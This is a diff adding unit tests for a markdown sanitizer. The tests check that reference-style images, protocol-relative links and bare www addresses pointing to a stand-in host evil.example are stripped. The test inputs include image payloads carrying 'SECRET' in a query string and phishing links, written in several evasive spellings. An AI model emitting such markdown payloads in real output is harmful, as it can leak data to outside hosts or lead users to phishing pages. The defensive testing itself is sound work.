@@ -370,6 +370,51 @@ describe('sanitizeSectionMarkdown', () => {
     expect(out).toBe('See the filing and  alert(1) at  now.');
     expect(out).not.toMatch(/https?:|<|\]\(/);
   });
+
+  it('drops a reference-style image together with its protocol-relative definition', () => {
+    const out = sanitizeSectionMarkdown('Before.\n\n![a][r]\n\n[r]: //evil.example/p.png?q=SECRET\n\nAfter.');
+    expect(out).not.toMatch(/evil|SECRET|!\[|\]:/);
+    expect(out).toContain('Before.');
+    expect(out).toContain('After.');
+  });
+
+  it('drops definitions however they are written, so no reference can still resolve', () => {
+    const cases = [
+      '![a][r]\n\n[r]:\n//evil.example/p.png',
+      '![a][r]\n\n> [r]: //evil.example/p.png',
+      '![a][r]\n\n- [r]: //evil.example/p.png',
+      '![a][r]\n\n   [r]: <//evil.example/p.png> "title"',
+      '![a][r]\n\n[r]: //evil.example/p.png\n  "next-line title"',
+      '![a][]\n\n[a]: //evil.example/p.png',
+      '![a]\n\n[a]: //evil.example/p.png',
+      '![a][r]\n\n[r]: /\\/evil.example/p.png',
+      '![a][r]\r\n\r\n[r]: //evil.example/p.png\r\n',
+    ];
+    for (const md of cases) {
+      const out = sanitizeSectionMarkdown(md);
+      expect(out, JSON.stringify(md)).not.toMatch(/evil|!\[|\]:|title/);
+    }
+  });
+
+  it('keeps the words of a reference-style link and drops its protocol-relative target', () => {
+    const out = sanitizeSectionMarkdown('Read [the filing][r] and [more][] now.\n\n[r]: //evil.example/phish\n[more]: //evil.example/more');
+    expect(out.trim()).toBe('Read the filing and more now.');
+  });
+
+  it('drops images whose alt text holds brackets, and links to protocol-relative targets', () => {
+    const out = sanitizeSectionMarkdown('![[x]](https://evil.example/p.png) and [click](//evil.example/phish) and [[nested]](//evil.example/n) ![open');
+    expect(out).not.toMatch(/evil|!\[|\]\(/);
+    expect(out).toContain('click');
+  });
+
+  it('removes bare www addresses, which GFM would turn into links', () => {
+    expect(sanitizeSectionMarkdown('See www.evil.example/phish today.')).toBe('See  today.');
+  });
+
+  it('leaves footnotes and ordinary bracketed text alone', () => {
+    const md = 'Revenue grew [Note]: it doubled.\n\n[Verified]: revenue grew twice\n\nA point.[^1]\n\n[^1]: A footnote.';
+    expect(sanitizeSectionMarkdown(md)).toBe(md);
+  });
 });
 
 describe('the figure guard: hostile spellings and look-alike units', () => {
